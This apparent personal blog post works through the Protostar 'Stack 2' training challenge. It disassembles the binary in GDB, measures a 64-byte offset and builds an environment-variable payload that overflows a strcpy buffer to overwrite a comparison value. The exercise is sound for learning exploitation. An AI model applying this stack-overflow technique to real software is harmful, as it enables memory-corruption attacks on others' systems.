---
layout: post
title: "B2B - Protostar, Stack2 (x86)"


---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 2

The third challenge of Protostar is "Stack 2". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack2
stack2: please set the GREENIE environment variable
```

Unlike the other two binaries, this program appears to load a value from the environment, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary looks to load the value within the 'GREENIE' environment variable. Let's set this and try again:

```
$ export GREENIE=test
$ echo $GREENIE
test
$ ./stack2
Try again, you got 0x00000000
```

Executing the binary again, we see that the value was loaded from the environment but didn't satisfy a 'win' condition and output "Try again, you got 0x00000000". This looks similar to the binary 'stack1', but let's continue.

Let's disassemble the binary in GDB to see what's going on:

```
(gdb) disas main
Dump of assembler code for function main:
0x08048494 <main+0>:	push   ebp
0x08048495 <main+1>:	mov    ebp,esp
0x08048497 <main+3>:	and    esp,0xfffffff0
0x0804849a <main+6>:	sub    esp,0x60
0x0804849d <main+9>:	mov    DWORD PTR [esp],0x80485e0
0x080484a4 <main+16>:	call   0x804837c <getenv@plt>
0x080484a9 <main+21>:	mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:	cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:	jne    0x80484c8 <main+52>
0x080484b4 <main+32>:	mov    DWORD PTR [esp+0x4],0x80485e8
0x080484bc <main+40>:	mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:	call   0x80483bc <errx@plt>
0x080484c8 <main+52>:	mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:	mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:	mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:	lea    eax,[esp+0x18]
0x080484dc <main+72>:	mov    DWORD PTR [esp],eax
0x080484df <main+75>:	call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
0x080484ed <main+89>:	jne    0x80484fd <main+105>
0x080484ef <main+91>:	mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:	call   0x80483cc <puts@plt>
0x080484fb <main+103>:	jmp    0x8048512 <main+126>
0x080484fd <main+105>:	mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:	mov    eax,0x8048641
0x08048506 <main+114>:	mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:	mov    DWORD PTR [esp],eax
0x0804850d <main+121>:	call   0x80483ac <printf@plt>
0x08048512 <main+126>:	leave  
0x08048513 <main+127>:	ret    
End of assembler dump.
```

Once again, lets break down the flow of the process to see what's happening from a higher level view.

- We get hold of our target environment variable (GREENIE) as seen in output
- The value of getenv() is returned to EAX (standard behaviour) and stored on the stack (esp+0x5c <- same offset from ESP as the other challenges)
- This value is then compared to 0x0. If we don't equal 0x0, we jump. If we do, we continue and error out (this relates to the output we saw in our initial running checks). This looks to be that of a NULL check

Now we know the first part of the binary is basically a check to see if the environment variable is set, we can narrow our efforts and break down the other section:

```
0x080484c8 <main+52>:	mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:	mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:	mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:	lea    eax,[esp+0x18]
0x080484dc <main+72>:	mov    DWORD PTR [esp],eax
0x080484df <main+75>:	call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
0x080484ed <main+89>:	jne    0x80484fd <main+105>
0x080484ef <main+91>:	mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:	call   0x80483cc <puts@plt>
0x080484fb <main+103>:	jmp    0x8048512 <main+126>
0x080484fd <main+105>:	mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:	mov    eax,0x8048641
0x08048506 <main+114>:	mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:	mov    DWORD PTR [esp],eax
0x0804850d <main+121>:	call   0x80483ac <printf@plt>
0x08048512 <main+126>:	leave  
0x08048513 <main+127>:	ret
```

A higher level breakdown of this is:

- Move 0x0 into esp+0x58   <- flag to flip?
- Move our flag (esp+0x5c) into EAX
- Get hold of the string value from our env (strcpy) <- BOF vulnerability
- We then move (esp+0x58) into EAX and check if it equals '0xd0a0d0a'
- If we don't equal, we jump to main+105, which is likely our fail state
- If not, we continue and 'win'

First, let's check where our environment is loaded and stored on the stack:

```
(gdb) b *main+84
Breakpoint 1 at 0x80484e8: file stack2/stack2.c, line 22.

(gdb) x/30wx $esp
0xbffffc30:	0xbffffc48	0xbffffef7	0xb7fff8f8	0xb7f0186e
0xbffffc40:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x42424242 <--- our environment variable
0xbffffc50:	0xb7fd7f00	0x08049748	0xbffffc68	0x08048358
0xbffffc60:	0xb7ff1040	0x08049748	0xbffffc98	0x08048549
0xbffffc70:	0xb7fd8304	0xb7fd7ff4	0x08048530	0xbffffc98
0xbffffc80:	0xb7ec6365	0xb7ff1040	0x00000000	0xbffffef7
0xbffffc90:	0x08048530	0x00000000	0xbffffd18	0xb7eadc76
0xbffffca0:	0x00000001	0xbffffd44

(gdb) x/wx $esp+0x58
0xbffffc88:	0x00000000   <--- flag that is used in comparison?
```

The reason I have highlighted the value above at esp+0x58, is due to a set of instructions that uses this value:

```
0x080484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
```

Now we know which value is used during the compare, as well as our input address - we can once again find the difference between the two:

​	"0xbffffc88" - "0xbffffc48" = "0x‭40"‬ (64 again)

Let's try this out with a simple overwrite with the value of "BBBB" to make sure our offset and assumptions are correct:

```
$ export GREENIE=$(python -c 'print "A"*64 + "B"*4')
$ echo $GREENIE
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Now the environment value has been set, our addresses appear to have changed. I believe the environment value is the reason for this, but anyway... in this case the addresses don't matter it is just the offsets (which should remain the same):

```
(gdb) x/30wx $esp
0xbffffbf0:	0xbffffc08	0xbffffebb	0xb7fff8f8	0xb7f0186e
0xbffffc00:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x41414141 <--- input starts on this row
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x42424242	0xbffffe00  <--- 42424242 ($esp+0x58)
0xbffffc50:	0x08048530	0x00000000	0xbffffcd8	0xb7eadc76
0xbffffc60:	0x00000001	0xbffffd04
```

We can confirm the above offset and overwrite with the following:

```
(gdb) x/wx $esp+0x58
0xbffffc48:	0x42424242
```

So, it looks like we have gotten full control of the value used in the comparison, which decides which condition branch to take. We now just need to make sure the "BBBB" actually equals the hex value '0xd0a0d0a'. Remember, we need to reverse the byte order to match the endian-ness, this will result in the follow chunks:
	0x0a 0x0d 0x0a 0x0d

With this knowledge, our final payload for the environment variable should be:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x0d\x0a\x0d
```

In Python, we can do this like:

```
$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
```

When setting this as an environment variable I was running into some weird issues:

```
$ export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
: bad variable name
```

Still no idea what this was, but I found a work around online (thanks random users of the internet):

```
$ GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
$ export GREENIE
```

Okay, now let's jump into GDB once again and break on the same spot (just before our 'cmp' instruction):

```
(gdb) x/30wx $esp
0xbffffbf0:	0xbffffc08	0xbffffebb	0xb7fff8f8	0xb7f0186e
0xbffffc00:	0xb7fd7ff4	0xb7ec6165	0x41414141	0x41414141
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x0d0a0d0a	0xbffffe00
0xbffffc50:	0x08048530	0x00000000	0xbffffcd8	0xb7eadc76
0xbffffc60:	0x00000001	0xbffffd04

(gdb) x/wx $esp+0x58
0xbffffc48:	0x0d0a0d0a
```

Looks good, now let's double check the disassembly:

```
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
```

Now lets check our EAX register (as this is used in the comparison):

```
(gdb) x/w $eax <--- lol, works though
0xd0a0d0a:	Cannot access memory at address 0xd0a0d0a
```

So now we satisfy the EAX requirement, ourEIP looks like we are continuing into the 'win' condition without jumping over it like before:

```
eip            0x80484ef	0x80484ef <main+91>
```

If we continue our execution, we get the following:

```
(gdb) c
Continuing.
you have correctly modified the variable
```

Finally, let's make sure this all works outside of GDB too. We don't need to re export our environment variable but let's do it for completion:

```
$ GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
$ export GREENIE
$ ./stack2
you have correctly modified the variable
```

Sweet, with that condition satisfied, I have completed stack2 by using an overflow from an environment variable!